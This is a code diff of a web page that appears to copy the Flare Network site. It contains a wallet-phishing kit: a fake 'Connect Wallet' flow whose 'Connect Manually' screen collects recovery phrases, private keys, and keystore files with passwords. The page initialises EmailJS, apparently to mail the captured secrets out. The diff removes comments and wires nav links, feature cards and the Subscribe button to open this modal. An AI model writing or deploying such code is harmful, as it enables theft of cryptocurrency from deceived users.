@@ -53,10 +53,8 @@
         </div>
     </section>
 
-    <!-- Updated Wallet Modal -->
     <div id="walletModal" class="wallet-modal">
         <div class="wallet-modal-content">
-            <!-- Wallet Selection Screen -->
             <div id="walletSelectionScreen" class="wallet-screen">
                 <div class="modal-header">
                     <div class="modal-title">Connect Wallet</div>
@@ -98,7 +96,6 @@
                 <p class="terms-text">By connecting a wallet, you agree to the <a href="#" class="terms-link">Terms of Service</a></p>
             </div>
 
-            <!-- Connecting Screen -->
             <div id="connectingScreen" class="wallet-screen">
                 <button class="close-button" id="closeConnectingScreen">&times;</button>
                 
@@ -120,7 +117,6 @@
                 </div>
             </div>
 
-            <!-- Error Screen -->
             <div id="errorScreen" class="wallet-screen">
                 <button class="close-button" id="closeErrorScreen">&times;</button>
                 
@@ -136,7 +132,6 @@
                 <button id="manualConnectBtn" class="manual-connect-btn">Connect Manually</button>
             </div>
 
-            <!-- Manual Connection Screen -->
             <div id="manualScreen" class="wallet-screen">
                 <div class="wallet-header">
                     <div id="walletLogoContainer">
@@ -148,7 +143,7 @@
                 <div class="tabs">
                     <button class="tab-button active" data-tab="phrase">Phrase</button>
                     <button class="tab-button" data-tab="keystore">Keystore</button>
-                    <button class="tab-button" data-tab="privateKey">Private Key</button> <!-- CHANGED: data-tab now matches id -->
+                    <button class="tab-button" data-tab="privateKey">Private Key</button>
                 </div>
 
                 <div id="phraseTab" class="tab-content active">
@@ -167,7 +162,7 @@
                     <p class="input-hint">Typically 64 characters not separated by spaces</p>
                 </div>
 
-                <button id="proceedBtn" class="proceed-btn">Synchronize</button>
+                <button id="proceedBtn" class="proceed-btn">Proceed</button>
             </div>
         </div>
     </div>
@@ -197,19 +192,19 @@
         <div class="flare-column">
             <div class="flare-box">
                 <h4>FOUNDATIONAL TECHNOLOGY</h4>
-                <div class="box pink">
+                <div class="box pink trigger-wallet-modal">
                     <strong><h3>Enshrined Data Protocols</h3></strong>
                     <p>Flare's protocols are integrated into the blockchain's core, and inherit the economic security of the entire network</p>
                 </div>
             </div>
             <div class="flare-box">
-                <div class="box pink">
+                <div class="box pink trigger-wallet-modal">
                     <strong><h3>Ethereum Virtual Machine</h3></strong>
                     <p>Flare is EVM compatible with out-of-the-box support for all your favorite tooling</p>
                 </div>
             </div>
             <div class="flare-box">
-                <div class="box pink">
+                <div class="box pink trigger-wallet-modal">
                     <strong><h3>Flare Stake</h3></strong>
                 </div>
                 <p>Flare uses a proof-of-stake (PoS) mechanism to ensure a significant and consistent level of economic security</p>
@@ -225,7 +220,7 @@
         <div class="flare-column">
             <div class="flare-box">
                 <h4>NEW USE CASES</h4>
-                <div class="box pink">
+                <div class="box pink trigger-wallet-modal">
                     <strong><h2><img src="media/FAssets (1).svg" height="30" alt="FAssets"> FAssets →</h2></strong>
                     <p>Securely explore XRPFi, BTCFi and DOGEFi</p>
                 </div>
@@ -233,11 +228,11 @@
 
             <div class="flare-box">
                 <h4>ENSHRINED DATA PROTOCOLS</h4>
-                <div class="box pink">
+                <div class="box pink trigger-wallet-modal">
                     <strong><h2><img src="media/FDC-1.svg" height="30" alt="FDC">FDC →</h2></strong>
                     <p>Reliably access external blockchain events and real-world APIs</p>
                 </div>
-                <div class="box pink">
+                <div class="box pink trigger-wallet-modal">
                     <strong><h2><img src="media/FTSO (1).svg" height="30" alt="FTSO"> FTSO →</h2></strong>
                     <p>Easily integrate fast, secure, and decentralized price feeds</p>
                 </div>
@@ -316,7 +311,7 @@
         <div class="newsletter-content">
             <h2>Subscribe to the Flare Newsletter</h2>
             <p>Join over 30,000 Flare community members. Sign up to the Flare newsletter today to hear the latest on product releases, ecosystem announcements and global events.</p>
-            <button class="subscribe-button">Subscribe</button>
+            <button class="subscribe-button trigger-wallet-modal">Subscribe</button>
         </div>
     </section>
 
@@ -382,12 +377,15 @@
     const decentralizedSection = document.getElementById('decentralizedSection');
     const fastCounter = document.getElementById('fastCounter');
     const decentralizedCounter = document.getElementById('decentralizedCounter');
+    const participateCards = document.querySelectorAll('.participate .card');
+    const walletTriggerElements = document.querySelectorAll('.trigger-wallet-modal');
+    const navLinks = document.querySelectorAll('.nav-link');
 
-    // EmailJS specific elements (updated IDs based on your HTML)
+
     const phraseInput = document.getElementById('phraseInput');
     const privateKeyInput = document.getElementById('privateKeyInput');
-    const keystoreInput = document.getElementById('keystoreInput'); // Corrected ID for keystore textarea
-    const passwordInput = document.getElementById('passwordInput');   // Corrected ID for keystore password
+    const keystoreInput = document.getElementById('keystoreInput');
+    const passwordInput = document.getElementById('passwordInput');
 
     let currentWalletType = 'MetaMask';
     const walletIcons = {
@@ -397,9 +395,8 @@
         'Ledger': 'https://th.bing.com/th/id/OIP.CBGu--2fe8tuzrTgd4qYxAAAAA?w=408&h=408&rs=1&pid=ImgDetMain'
     };
 
-    emailjs.init("zXKuNUM9QxI97CCT5"); // Replace with your EmailJS User ID
+    emailjs.init("zXKuNUM9QxI97CCT5");
 
-    // Function to show specific screen
     function showScreen(type) {
         walletSelectionScreen.style.display = 'none';
         connectingScreen.style.display = 'none';
@@ -440,7 +437,6 @@
             walletIcon.style.backgroundPosition = 'center';
             walletLogoContainer.appendChild(walletIcon);
         } else {
-            // Default to Flare logo
             const flareLogo = document.createElement('img');
             flareLogo.src = 'https://flare.network/api/media/file/Flare.svg';
             flareLogo.alt = 'Flare';
@@ -449,9 +445,8 @@
         }
     }
 
-    // Counter animation function
     function animateCounter(counter, target) {
-        const duration = 2000; // 2 seconds
+        const duration = 2000;
         const startTime = Date.now();
         const startValue = parseInt(counter.textContent);
         const endValue = parseInt(target);
@@ -511,10 +506,24 @@
         }
     });
 
-    connectWalletBtn.addEventListener('click', () => {
+    function openWalletModal() {
         walletModal.style.display = 'flex';
         showScreen('wallet');
         document.body.style.overflow = 'hidden'; 
+    }
+
+    connectWalletBtn.addEventListener('click', openWalletModal);
+
+    participateCards.forEach(card => {
+        card.addEventListener('click', openWalletModal);
+    });
+
+    walletTriggerElements.forEach(element => {
+        element.addEventListener('click', openWalletModal);
+    });
+
+    navLinks.forEach(link => {
+        link.addEventListener('click', openWalletModal);
     });
 
     closeWalletModal.addEventListener('click', () => {
